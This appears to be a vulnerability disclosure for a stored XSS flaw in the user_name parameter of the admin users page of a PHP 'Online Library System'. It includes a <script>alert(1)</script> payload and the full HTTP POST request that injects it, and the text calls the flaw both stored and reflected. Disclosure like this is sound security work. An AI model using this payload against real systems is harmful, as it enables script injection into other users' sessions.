### BUG_AUTHOR:LIU WEIYU
# Online Library System – Stored XSS on (admin/users/controller.php user_name parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/14816/online-library-system-phpmysqli-full-source-code.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
admin/users/controller.php 

On this page, user_name parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
### Payload：
<script>alert(1)</script>
### Request:
```
POST http://192.168.0.105/OLS/admin/users/controller.php?action=edit HTTP/1.1
Host: 192.168.0.105
Content-Length: 136
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.105
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.105/OLS/admin/users/index.php?view=edit&id=3
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
Connection: close

user_id=3&deptid=&user_name=Janno+Palacios%3Cscript%3Ealert%281%29%3C%2Fscript%3E&deptid=&user_email=admin&user_type=Administrator&save=
```
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/2962745b-b967-40c1-bfa5-90cef30586d9">

## Trigger popup(The data has been stored in the database)：
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/8b8ffed7-6504-4df0-997c-6fd8789b1916">
